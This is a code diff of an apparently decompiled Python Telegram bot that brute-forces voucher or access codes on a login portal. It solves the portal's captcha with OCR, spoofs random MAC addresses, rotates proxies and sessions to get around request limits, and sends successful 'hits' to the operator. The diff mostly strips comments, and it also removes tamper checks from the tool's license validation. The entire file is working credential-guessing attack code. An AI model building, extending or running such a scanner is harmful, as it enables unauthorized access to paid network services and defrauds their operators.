@@ -192,14 +192,10 @@ def display_remaining_time(expiry_date):
 
 
 def check_approval():
-    """Fetch license file from GitHub and validate this machine's key."""
-    github_url = f"https://api.github.com/repos/{GITHUB_OWNER}/contents/{GITHUB_REPO}"
-    headers = {
-        "Authorization": f"Bearer {GITHUB_TOKEN}",
-        "Accept": "application/vnd.github.v3.raw",
-    }
+    """Fetch license file from GitHub (license.txt) and validate this machine's key."""
+    github_url = f"https://raw.githubusercontent.com/{GITHUB_OWNER}/{GITHUB_REPO}/main/license.txt"
     try:
-        response = requests.get(github_url, headers=headers, timeout=TIMEOUT_SEC)
+        response = requests.get(github_url, timeout=TIMEOUT_SEC)
     except requests.RequestException:
         print(bred + "[!] Cannot reach license server. Online check required." + reset)
         sys.exit(1)
@@ -211,10 +207,8 @@ def check_approval():
     lines = response.text.splitlines()
     for line in lines:
         parts = line.split(":")
-        if len(parts) >= 3 and parts[0] == my_key:
+        if len(parts) >= 2 and parts[0] == my_key:
             expiry_str = parts[1]
-            if encrypt_key_data(parts[0], parts[1]) != parts[2]:
-                break  # tampered record
             expiry_date = datetime.datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
             now = datetime.datetime.now()
             if now >= expiry_date:
@@ -456,20 +450,12 @@ async def check_balance(active_token, code, user_id, proxy_str):
 async def check_single_access_code(session, code, current_session_id,
                                    login_url, captcha_base_url, verify_url,
                                    headers, user_id, current_proxy):
-    """
-    Check one voucher code:
-      1. GET captcha image (OCR via ddddocr)
-      2. POST captcha/verify
-      3. POST voucher login  ->  '"success":true' == HIT
-    Returns a status string: 'hit' / 'limit' / 'bad' / 'net' / 'captcha'
-    """
     try:
         captcha_url = captcha_base_url + str(int(time.time() * 1000))
         captcha_text = await solve_captcha_simple_async(session, captcha_url, headers)
         if not captcha_text:
             return "net"
 
-        # --- captcha verify ---------------------------------------------------
         v_payload = {"authCode": captcha_text, "sessionId": current_session_id}
         async with session.post(verify_url, json=v_payload, headers=headers,
                                 timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
@@ -478,7 +464,6 @@ async def check_single_access_code(session, code, current_session_id,
         if '"success":true' not in v_data.replace(" ", ""):
             return "captcha"
 
-        # --- voucher login ----------------------------------------------------
         mac = generate_random_mac()
         l_payload = {
             "accessCode": code,
@@ -491,15 +476,7 @@ async def check_single_access_code(session, code, current_session_id,
                                 ssl=False) as l_resp:
             body = await l_resp.text()
 
-        body_snippet = body[:300]
         if '"success":true' in body.replace(" ", ""):
-            # extract active token / sessionId for balance lookup
-            active_token = current_session_id
-            try:
-                j = json.loads(body)
-                active_token = j.get("sessionId") or j.get("token") or current_session_id
-            except Exception:
-                pass
             return "hit"
 
         if ("request limited" in body) or ("the number of sta exceeds the limit" in body):
@@ -537,7 +514,6 @@ def make_code(mode, start_digit=6, counter=None):
 
 
 async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
-    """One scanning worker: owns a proxied session, rotates SID/session."""
     pm = get_proxy_manager()
     state = user_scanners.get(user_id)
     if state is None:
@@ -571,7 +547,6 @@ async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, us
                    and codes_checked_this_sid < MAX_CODES_PER_SID
                    and not stop_event.is_set()):
 
-                # ---- pick a code -------------------------------------------------
                 for _ in range(20):
                     if mode == "custom":
                         state["counter"] += 1
@@ -605,13 +580,12 @@ async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, us
                             chat_id=user_id, text=msg, parse_mode=ParseMode.MARKDOWN)
                     except Exception:
                         pass
-                    # fresh session after a hit
                     break
 
                 elif result == "limit":
                     state["limits"] += 1
                     state["recent_logs"].append(f"⚠️ LIMIT: {code}")
-                    break  # rotate SID
+                    break
 
                 elif result == "net":
                     state["net"] += 1
@@ -643,7 +617,6 @@ async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, us
 
 
 async def live_dashboard_updater(context: "ContextTypes.DEFAULT_TYPE", user_id: int):
-    """Periodically refresh the live stats dashboard message."""
     state = user_scanners.get(user_id)
     if state is None:
         return
@@ -684,7 +657,6 @@ async def live_dashboard_updater(context: "ContextTypes.DEFAULT_TYPE", user_id: 
 
 
 async def run_user_scanner(context: "ContextTypes.DEFAULT_TYPE", user_id: int):
-    """Launch NUM_WORKERS workers + the live dashboard for one user."""
     if user_scanners.get(user_id, {}).get("running"):
         return
     portal_url = get_user_data(user_id) or PORTAL_INDEX
@@ -912,7 +884,6 @@ async def handle_text(update: Update, context: "ContextTypes.DEFAULT_TYPE", *arg
     pm = get_proxy_manager()
     mode = context.user_data.get("selected_mode", "num6")
 
-    # ---- waiting for portal URL --------------------------------------------
     if context.user_data.get("waiting_for_portal_url"):
         context.user_data["waiting_for_portal_url"] = False
         if not raw_text.lower().startswith(("http://", "https://")):
@@ -934,7 +905,6 @@ async def handle_text(update: Update, context: "ContextTypes.DEFAULT_TYPE", *arg
             reply_markup=get_main_menu_markup())
         return
 
-    # ---- waiting for proxy list --------------------------------------------
     if context.user_data.get("waiting_for_proxy_text"):
         context.user_data["waiting_for_proxy_text"] = False
         lines = [l.strip() for l in raw_text.splitlines() if l.strip()]
@@ -957,7 +927,6 @@ async def handle_text(update: Update, context: "ContextTypes.DEFAULT_TYPE", *arg
             reply_markup=get_main_menu_markup())
         return
 
-    # ---- waiting for custom start digit ------------------------------------
     if context.user_data.get("waiting_for_digit"):
         context.user_data["waiting_for_digit"] = False
         if not raw_text.isdigit():
@@ -975,7 +944,6 @@ async def handle_text(update: Update, context: "ContextTypes.DEFAULT_TYPE", *arg
             reply_markup=get_main_menu_markup())
         return
 
-    # ---- default: show panel -------------------------------------------------
     saved_url = get_user_data(user_id)
     total, bad = pm.stats()
     portal_line = "🌐 Portal: ready ✅" if saved_url else \
@@ -1011,7 +979,7 @@ def main():
 
 
 # ==============================================================================
-#  ENTRY POINT  (the compiled .so ran these at import time)
+#  ENTRY POINT
 # ==============================================================================
 
 show_banner()
